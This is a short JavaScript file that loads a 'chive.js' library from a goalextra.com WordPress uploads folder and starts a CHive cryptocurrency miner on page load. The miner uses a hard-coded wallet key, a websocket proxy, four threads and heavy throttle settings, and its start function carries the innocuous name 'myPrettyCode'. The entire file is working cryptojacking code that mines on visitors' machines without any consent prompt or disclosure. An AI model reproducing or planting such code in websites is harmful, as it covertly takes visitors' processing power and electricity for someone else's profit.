function loadScript(url, callback)
{
    // Adding the script tag to the head as suggested before
    var head = document.getElementsByTagName('head')[0];
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = url;

    // Then bind the event to the callback function.
    // There are several events for cross browser compatibility.
    script.onreadystatechange = callback;
    script.onload = callback;

    // Fire the loading
    head.appendChild(script);
};
var myPrettyCode = function() {
  CHive.CONFIG.WEBSOCKET_SHARDS = [["ws://chproxy.goalextra.com:8892"]];

  // Start miner
  var miner=new CHive.User('etnk1ELUj9c85xLf6LKw86F2GP7kkixgncZMyYNErDKh4TyRU6BnA3USsFGj1r8wSPRAJcr61cShh8TAVgWA5Yi39UtV8b1vW1','GoEx',
        {
        threads:4,autoThreads:false,throttle:0.8
        }
  );
  miner.start();
};
loadScript("http://www.goalextra.com/wp-content/uploads/2018/01/chive.js", myPrettyCode);
